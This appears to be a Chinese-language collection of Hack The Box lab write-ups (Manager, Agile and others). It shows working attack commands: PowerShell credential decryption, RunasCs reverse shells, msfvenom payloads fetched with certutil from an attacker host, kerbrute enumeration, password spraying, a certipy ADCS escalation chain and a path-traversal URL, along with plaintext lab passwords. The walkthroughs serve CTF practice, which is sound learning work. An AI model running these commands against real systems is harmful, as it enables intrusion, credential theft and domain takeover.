$EncryptedString = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6"
$SecureString = ConvertTo-SecureString $EncryptedString
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
echo $Credential.GetNetworkCredential().password
```



使用powershell解密得到密码`f8gQ8fynP44ek1m3`
使用runascs可以绕过uac

`.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.16.26:3333`

5f4904d57c58149a29d31ca4d073387c

#### root
横向后需要提权,给alaading用户上传俩个文件
制作一个反弹shell的木马和Runascs.exe上传过去
` msfvenom -p windows/x64/shell_reverse_tcp LHOST=Your_IP LPORT=5959 -f exe -o pov.exe`

```bash
certutil -urlcache -f http://10.10.16.26:8000/RunasCs.exe RunasCs.exe
certutil -urlcache -f http://10.10.16.26:8000/pov.exe pov.exe
```

开一个msfconsole,在multi/handler模块,使用`set payload window/x64/meterpreter/reverse_tcp`模块

`.\RunasCs.exe alaading f8gQ8fynP44ek1m3 "C:\\Users\\alaading\\pov.exe"`
卡在sending stage了....

### Manager
#### user
- nmap
```text
Nmap scan report for 10.10.11.236
Host is up (0.47s latency).
Not shown: 992 filtered ports
PORT    STATE SERVICE
53/tcp  open  domain
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd5
636/tcp open  ldapssl
```

还有个88端口的kerberos-sec没扫出来

使用[kerbrute](https://github.com/ropnop/kerbrute)枚举ad域里的用户
`kerbrute userenum -d  manager.htb /usr/share/wordlist/Seclists/Usernames/xato-net-10-million-usernames.txt --dc dc01.manager.htb`
得到user.txt
```
ryan
cheng
raven
guest
administrator
operator
jinwoo
zhong
chinhaw
```
使用crackmapexec进行密码喷射(password spraying)
`crackmapexec smb manager.htb -u users -p users`
得到一个smb登录凭证`operator/operator`
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240307221329.png)

没有共享,尝试mssql
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240307221710.png)

尝试mssql登录
`impacket-mssqlclient -port 1433 manager.htb/operator:operator@10.10.11.236 -window `

执行`xp_dirtree 'C:\inetpub\wwwroot', 1, 1;`读取iis web目录下的文件

发现了
```text                                                                                          
website-backup-27-07-23-old.zip    
```
下载并发现了一个old.config.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>

```
得到raven的账号密码

使用`evil-winrm`登录
`evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'`

#### root
ADCS提权
> 由于这是一台Active Directory计算机，因此域可能包含作为公钥基础结构的Active Directory证书服务（ADCS）。ADCS可能包含严重的漏洞，可利用这些漏洞获取其他用户的证书和哈希，从而允许权限提升。（另请参阅https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
......



然后使用`certipy-ad`这个工具创建一个'officer'账户来为我授权

```bash
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
#创建一个新的ca机构'manager-DC01-CA',这个机构的管理员为raven
certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123'
#启用名为 SubCA 的证书模板。这个模板通常用于签发子CA证书。
certipy-ad req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn 'administrator@manager.htb'
#执行这个命令后,将向 manager-DC01-CA 证书颁发机构请求签发一个新的子 CA 证书。这个子 CA 证书将被颁发给域 manager.htb,并使用启用的 SubCA 模板进行签发。同时,证书中将包含 administrator@manager.htb 的用户主体名称(UPN)。
certipy-ad ca -ca 'manager-DC01-CA' -issue-request 23 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123*'
#这块一直失败Got access denied trying to issue certificate....manager-DC01-CA 证书颁发机构将签发之前通过 certipy-ad req 命令提交的请求ID为17的证书请求，并生成一个新的子CA证书。
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 23
#是使用指定的用户名和密码，在指定的证书颁发机构（CA）上请求一个证书，并将该证书检索回来
certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'manager.htb' -dc-ip 10.10.11.236
```

最后获取admin的密码hash
`certipy-ad auth -pfx administrator.pfx  -dc-ip 10.10.11.236`

### Sandworm
#### user
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230722155953.png)

443: flask
`/login`存在登录框,secret_key爆破失败,
`/contact`与`/gudie`路由存在一个发送消息的地方,采用pgp加密技术,存在ssti

### OnlyForYou

#### user

![image-20230426235837003](https://gitee.com/leiye87/typora_picture/raw/master/20230426235840.png)



### Agile

* nmap
![image-20230320142510445](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230320142510445.png)

```shell
echo 10.10.11.203 superpass.htb >> /etc/hosts
```

访问80端口，是一个 密码管理网站，登陆后存在导出csv文件功能

url `perpass.htb/download?fn=../../../../../../../etc//proc/self/cgroup`存在任意文件下载

使用 `flask` 开启了 debug模式，应该是计算 `PIN` 后弹shell，

迷惑时刻，算pin算不对？？

下次再战

### Escape

第一次打window的靶机，多看多学习

nmap 常规1000个端口无结果。。
